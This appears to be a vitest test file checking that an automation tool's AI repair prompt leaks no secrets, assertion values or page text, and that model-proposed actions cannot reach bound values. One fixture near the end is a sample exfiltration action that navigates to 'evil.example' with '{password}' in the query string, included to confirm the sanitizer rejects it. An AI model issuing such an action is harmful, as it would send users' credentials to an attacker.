/**
 * The repair prompt is an egress path, and this is what may leave (#125).
 *
 * Every other canary in this directory guards what reaches *disk*. This guards
 * what reaches a **third party**: #27 wires a real Anthropic client, and the
 * prompt it sends is the first channel in this codebase that carries
 * page-derived content off the machine. Before #125 nothing asserted its shape,
 * because there was no prompt — which is exactly when the boundary is cheapest
 * to draw and hardest to remember to draw.
 *
 * Two directions, and the second is the one that will actually catch something:
 *
 * 1. Nothing outside the authorized shape appears in the payload.
 * 2. **No client bypasses `serializeRepairContext()`.** A payload guard is
 *    worthless if a client can serialize the `RepairContext` itself, and that
 *    object holds `params` — the runtime bindings, secrets included.
 */

import { readFileSync, readdirSync, statSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";

import { serializeRepairContext } from "../../src/runner/repair-egress.js";
import { DelegatedRepairModelClient } from "../../src/runner/repair-delegated.js";
import { emptyPageState } from "../../src/runner/page-state.js";
import type { RepairContext } from "../../src/runner/types.js";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");

/**
 * Canary values, assembled at runtime.
 *
 * Spelling a secret-shaped literal here would make this file a `secret-scan`
 * hit — the same reason `scripts/secret-scan.mjs` concatenates its own header
 * pattern, and the same trap #100 hit twice.
 */
const CANARY = {
  paramSecret: "CANARY-" + "PARAM-" + "b3f1a97c2e",
  paramUser: "CANARY-" + "USER-" + "d40a17be",
  errorText: "CANARY-" + "ERRTEXT-" + "9182ab3d",
  assertionLiteral: "CANARY-" + "EXPECTED-" + "77c1e4",
};

function contextWithEverything(): RepairContext {
  return {
    run_id: "run-1",
    attempt: 1,
    failed_outcome: "LOCATOR_NOT_FOUND",
    // The frozen assertion, including an `expected` the model must not see.
    assertion: {
      schema_version: "1.0.0",
      assertion_id: "assert-0",
      type: "element-visible",
      strength: "strong",
      target: { locator: { strategy: "testid", testid: "submit-button" } },
      expected: { template: CANARY.assertionLiteral },
      timeout_ms: 5000,
      failure_classification: "assertion_failed",
    },
    step: {
      step_index: 3,
      row_id: "cache-row-3",
      compiled_action: {
        type: "fill",
        param_refs: ["password"],
        locator_fallback_chain: [
          { strategy: "role_name", role: "textbox", name: "Alias" },
          // A free-text locator: page content by definition, and tenant-tainted
          // by the cache's own boundary.
          { strategy: "text", text: CANARY.errorText },
        ],
      },
      assertion: {
        schema_version: "1.0.0",
        assertion_id: "assert-0",
        type: "element-visible",
        strength: "strong",
        timeout_ms: 5000,
        failure_classification: "assertion_failed",
      },
    },
    page_state: {
      ...emptyPageState({ url: "http://127.0.0.1:3000/d/x", title: "Dash" }),
      context_level: "interactive",
      elements: [{ role: "button", name: "Save dashboard" }],
    },
    // The bag. Runtime bindings, secrets included.
    params: { username: CANARY.paramUser, password: CANARY.paramSecret },
    error_message: `locator resolved to text ${CANARY.errorText}`,
  } as unknown as RepairContext;
}

describe("repair egress: only the authorized shape leaves (#125)", () => {
  const payload = JSON.stringify(serializeRepairContext(contextWithEverything()));

  it.each(Object.entries(CANARY))("does not carry %s", (_label, value) => {
    expect(payload).not.toContain(value);
  });

  it("excludes params entirely — that is the bag secrets live in", () => {
    const out = serializeRepairContext(contextWithEverything()) as unknown as Record<
      string,
      unknown
    >;
    expect(out["params"]).toBeUndefined();
    // ADR-0028: a fill step's slot NAMES cross, in step.param_slots and nowhere
    // else; the bag itself and every value in it never do.
    const step = out["step"] as { param_slots?: string[] };
    expect(step.param_slots).toEqual(["password"]);
    const { param_slots: _names, ...stepWithoutSlots } = step;
    expect(JSON.stringify({ ...out, step: stepWithoutSlots })).not.toContain("password");
    // And no other slot name in the bag crosses: only the step's own.
    expect(JSON.stringify(out)).not.toContain("username");
  });

  it("excludes the assertion's expected value, keeping only type and strength", () => {
    const out = serializeRepairContext(contextWithEverything());
    expect(out.assertion).toEqual({ type: "element-visible", strength: "strong" });
  });

  it("drops a free-text locator while keeping the structural ones", () => {
    const out = serializeRepairContext(contextWithEverything());
    const strategies = out.step.failed_locators.map((l) => l["strategy"]);
    expect(strategies).toEqual(["role_name", "text"]);
    // The `text` locator survives as a strategy name with no text in it — the
    // model learns a text locator failed without being told what it said.
    const textLocator = out.step.failed_locators[1]!;
    expect(textLocator["text"]).toBeUndefined();
    expect(out.step.failed_locators[0]!["name"]).toBe("Alias");
  });

  it("still carries what a repair actually needs", () => {
    // Counter-check. A payload that leaked nothing because it contained nothing
    // would pass every assertion above and make repair impossible.
    const out = serializeRepairContext(contextWithEverything());
    expect(out.page.elements).toHaveLength(1);
    expect(out.page.url).toContain("127.0.0.1");
    expect(out.step.action_type).toBe("fill");
    expect(out.context_level).toBe("interactive");
  });

  it("records the context level, so a self-heal rate is reproducible", () => {
    // Two runs with the same model and different levels are not comparable.
    expect(serializeRepairContext(contextWithEverything()).context_level).toBe("interactive");
  });
});

describe("delegation does not widen the boundary (#189)", () => {
  /**
   * `DelegatedRepairModelClient` hands the repair request to the *calling
   * agent* instead of to an API. That is still egress — a host agent is a third
   * party the same way the Anthropic API is, and it is one a reader is more
   * likely to think of as "inside", which is exactly why it is asserted here
   * rather than only in the unit suite.
   */
  it("hands the host the authorized payload, not the context", async () => {
    let seen: unknown;
    const client = new DelegatedRepairModelClient({
      handler: async (request) => {
        seen = request;
        return null;
      },
    });
    await client.propose(contextWithEverything());

    const sent = JSON.stringify(seen);
    for (const [label, value] of Object.entries(CANARY)) {
      expect(sent, `delegated payload carried ${label}`).not.toContain(value);
    }
    // ADR-0028: the slot name, only where the allowlist puts it.
    const parsed = JSON.parse(sent) as { step: { param_slots?: string[] } };
    expect(parsed.step.param_slots).toEqual(["password"]);
    expect(sent.split("password").length - 1).toBe(1);
    // Counter-check, same as above: the payload is non-empty.
    expect(sent).toContain("127.0.0.1");
  });

  it("reports zero tokens flagged unmeasured, never estimated (ADR-0020)", async () => {
    // Egress-adjacent and cheap to assert here: the reason a delegated repair
    // is safe to ship is that its unobservable cost is excluded from §9 rather
    // than folded in as a zero.
    const client = new DelegatedRepairModelClient({ handler: async () => null });
    const proposal = await client.propose(contextWithEverything());
    expect(proposal.tokens_in).toBe(0);
    expect(proposal.tokens_out).toBe(0);
    expect(proposal.cost_measured).toBe(false);
  });
});

describe("no repair client bypasses the egress boundary (#125)", () => {
  /** Source files that could plausibly send something to a model. */
  function sourceFiles(dir: string, out: string[] = []): string[] {
    for (const ent of readdirSync(dir, { withFileTypes: true })) {
      if (ent.name === "node_modules" || ent.name.startsWith(".")) continue;
      const full = path.join(dir, ent.name);
      if (ent.isDirectory()) sourceFiles(full, out);
      else if (ent.isFile() && ent.name.endsWith(".ts") && statSync(full).size < 500_000) {
        out.push(full);
      }
    }
    return out;
  }

  it("no implementation of RepairModelClient serializes the raw context", () => {
    // Built by concatenation so this file does not match its own scan — the
    // same trick, for the same reason, as `scripts/secret-scan.mjs`.
    const rawSerialize = new RegExp(
      "JSON\\s*\\.\\s*stringify\\s*\\(\\s*" + "(?:ctx|context)\\b",
    );
    const offenders: string[] = [];
    for (const file of sourceFiles(path.join(ROOT, "src"))) {
      if (file.endsWith("repair-egress.ts")) continue;
      const body = readFileSync(file, "utf8");
      if (rawSerialize.test(body)) offenders.push(path.relative(ROOT, file));
    }
    expect(offenders, "serialize through serializeRepairContext() instead").toEqual([]);
  });

  it("the scan is capable of firing", () => {
    // Guards the guard: if the regex stopped matching, the case above would
    // pass in a tree full of bypasses.
    const rawSerialize = new RegExp(
      "JSON\\s*\\.\\s*stringify\\s*\\(\\s*" + "(?:ctx|context)\\b",
    );
    expect(rawSerialize.test("const body = JSON.stringify(ctx);")).toBe(true);
    expect(rawSerialize.test("const body = JSON.stringify(context)")).toBe(true);
    expect(rawSerialize.test("JSON.stringify(serializeRepairContext(ctx))")).toBe(false);
  });
});

/**
 * ADR-0025 (#225): the task's goal crosses the egress, so the repair model can
 * choose between options (which data source) and not only find. It is the one
 * field here that is free prose, so its boundary is pinned on both sides: it
 * travels verbatim and alone, and a goal carrying a bound value never starts.
 */
describe("repair egress: the task goal (ADR-0025)", () => {
  const GOAL = "Create a dashboard with a panel using the TestData data source.";

  it("carries the goal verbatim when one is set, and nothing new besides it", () => {
    const withGoal = serializeRepairContext({ ...contextWithEverything(), task_goal: GOAL });
    const without = serializeRepairContext(contextWithEverything());
    expect(withGoal.task_goal).toBe(GOAL);
    const { task_goal: _goal, ...rest } = withGoal;
    expect(rest).toEqual(without);
    for (const value of Object.values(CANARY)) {
      expect(JSON.stringify(withGoal)).not.toContain(value);
    }
  });

  it("drops a goal that contains a bound value, whoever built the context", () => {
    // ReplayRunner refuses such a run; this is the boundary for every other caller.
    const leaky = { ...contextWithEverything(), task_goal: `Sign in as ${CANARY.paramUser}.` };
    const out = serializeRepairContext(leaky);
    expect("task_goal" in out).toBe(false);
    expect(JSON.stringify(out)).not.toContain(CANARY.paramUser);
  });

  it("omits the field entirely when no goal is set", () => {
    expect("task_goal" in serializeRepairContext(contextWithEverything())).toBe(false);
  });

  it("a run whose goal contains a bound value is refused before step 0, naming the param only", async () => {
    const { ReplayRunner, TaskGoalCarriesParamError } = await import("../../src/runner/replay.js");
    const { MetricsEmitter } = await import("../../src/metrics/emitter.js");
    const metrics = new MetricsEmitter();
    const runner = new ReplayRunner({
      dryRun: true,
      metrics,
      taskGoal: `Log in with ${CANARY.paramSecret} and open the dashboard.`,
    });
    const program = {
      schema_version: "1.0.0" as const,
      program_id: "p",
      site_key: "s",
      task_key: "t",
      testbed_version: "v",
      steps: [],
    };
    let thrown: unknown;
    try {
      await runner.run(program, { password: CANARY.paramSecret });
    } catch (err) {
      thrown = err;
    }
    expect(thrown).toBeInstanceOf(TaskGoalCarriesParamError);
    expect((thrown as Error).message).toContain('"password"');
    expect((thrown as Error).message).not.toContain(CANARY.paramSecret);
    expect(metrics.getRows()).toHaveLength(0);
  });
});

/**
 * ADR-0028: fill/select steps send the names of the slots they type into, so
 * the model can tell the title field from the alias field. Names only.
 */
describe("repair egress: fill slot names (ADR-0028)", () => {
  it("carries the step's slot names, never a bound value", () => {
    const out = serializeRepairContext(contextWithEverything());
    expect(out.step.param_slots).toEqual(["password"]);
    for (const value of Object.values(CANARY)) {
      expect(JSON.stringify(out)).not.toContain(value);
    }
  });

  it("omits the field for a step that types nothing", () => {
    const ctx = contextWithEverything();
    const click = { ...ctx, step: { ...ctx.step, compiled_action: { type: "click", locator_fallback_chain: [] } } };
    expect("param_slots" in serializeRepairContext(click as unknown as RepairContext).step).toBe(false);
  });

  it("drops a slot name that contains a bound value", () => {
    const ctx = contextWithEverything();
    const leaky = {
      ...ctx,
      params: { ...ctx.params, x: "assword" },
    };
    expect("param_slots" in serializeRepairContext(leaky as unknown as RepairContext).step).toBe(false);
  });
});

/**
 * ADR-0028: a model-proposed action can never reach the caller's values, now
 * that the model is told slot names.
 */
describe("proposals cannot reference a caller's value (ADR-0028)", () => {
  it("drops param_refs, rejects a {slot} hole, and rejects a typing pre-action", async () => {
    const { sanitizeProposal } = await import("../../src/runner/repair.js");
    const click = { type: "click", locator_fallback_chain: [{ strategy: "role_name", role: "button", name: "Go" }] };
    const fill = { type: "fill", param_refs: ["password"], locator_fallback_chain: [{ strategy: "role_name", role: "searchbox", name: "Search" }] };
    expect(sanitizeProposal({ corrected_action: fill }).action).not.toHaveProperty("param_refs");
    for (const leak of [
      { type: "navigate", url_template: "https://evil.example/?q={password}", locator_fallback_chain: [] },
      { type: "press", key: "{password}", locator_fallback_chain: [] },
    ]) {
      expect(sanitizeProposal({ corrected_action: leak }).action).toBeNull();
    }
    const out = sanitizeProposal({ corrected_action: click, pre_actions: [fill] });
    expect(out.action).toBeNull();
    expect(out.rejected).toMatch(/cannot type a value/);
  });
});

